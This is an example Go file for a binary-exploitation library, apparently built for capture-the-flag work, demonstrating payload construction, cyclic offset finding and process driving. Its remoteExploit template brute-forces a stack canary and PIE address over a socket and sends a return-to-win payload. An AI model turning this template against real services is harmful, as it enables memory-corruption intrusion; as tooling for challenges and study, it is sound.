// Command process demonstrates the binary-exploitation API: building payloads,
// finding a crash offset with a cyclic pattern, and driving a process.
//
// The offline parts and the local-process demo run anywhere with /bin/cat
// (`go run ./examples/process/`). The remote canary/PIE-leak exploit needs a
// real target binary, so it is a compiling template you point at your challenge.
package main

import (
	"fmt"
	"time"

	. "github.com/tonythetender/pwngears"
)

func main() {
	payloads()
	offsets()
	localProcess()
}

func payloads() {
	fmt.Println("== Building payloads ==")
	// Flat mixes raw bytes with little-endian integers in one call.
	p := Flat([]byte("AAAA"), uint64(0x401234), uint32(0xdeadbeef))
	fmt.Printf("  flat: %x\n", p.Bytes())

	// Or chain: pad to the offset, then stack return addresses (Ret aliases P64).
	rop := Pay().PadTo(40).P64(0x401186).Ret(0x401234)
	fmt.Printf("  rop:  %x (len %d)\n", rop.Bytes(), rop.Len())
}

func offsets() {
	fmt.Println("== Cyclic offset ==")
	pattern := Cyclic(200)
	// Say the program crashed and RSP held these four bytes from the pattern.
	leaked := pattern[80:84]
	fmt.Printf("  leaked %q is at offset %d\n", leaked, CyclicFind(leaked))
}

func localProcess() {
	fmt.Println("== Driving a local process ==")
	p := Process("/bin/cat") // cat echoes back whatever we send
	defer p.Close()

	p.SendLine("ping")
	fmt.Printf("  sent 'ping', received %q\n", p.RecvLineString())
}

// remoteExploit is a template for leaking a stack canary and a PIE base one byte
// at a time, then returning to a win function. It compiles against the current
// API; point NewRemote at your target to use it. The Exploit helpers need a raw
// tube, which NewRemote returns (unlike the no-error Remote wrapper).
func remoteExploit() {
	r, _ := NewRemote("127.0.0.1", 1337)
	defer r.Close()

	exploit := NewExploit(r)
	exploit.SetConnectFunc(func() Tube {
		c, _ := NewRemote("127.0.0.1", 1337)
		c.SendLine("Arthur")
		return c
	})

	// Byte-at-a-time leaks, brute-forced in parallel. The check reports a hit.
	canary, _ := exploit.LeakCanary(40, RecvLineContains("Saved"))
	retAddr, _ := exploit.LeakAddress(40, canary, 8, RecvLineContains("Saved"))

	pieBase := retAddr - 0x1811
	winAddr := pieBase + 0x12e9

	Pay().
		PadTo(40).
		Canary(canary).
		Repeat("B", 8).
		Ret(winAddr).
		SendWithSize(r)

	flag, _ := r.RecvAllString(3 * time.Second)
	Success(fmt.Sprintf("flag: %s", flag))
}

// gdbDebug is a template for attaching GDB to a local process. AttachGDB wants a
// raw tube, which the wrapper exposes as its embedded ProcessConn.
func gdbDebug() {
	p := Process("./vulnerable")
	defer p.Close()

	AttachGDB(p.ProcessConn, `
        b *main+42
        continue
    `)

	p.Send(Cyclic(100))
	p.Wait()
}
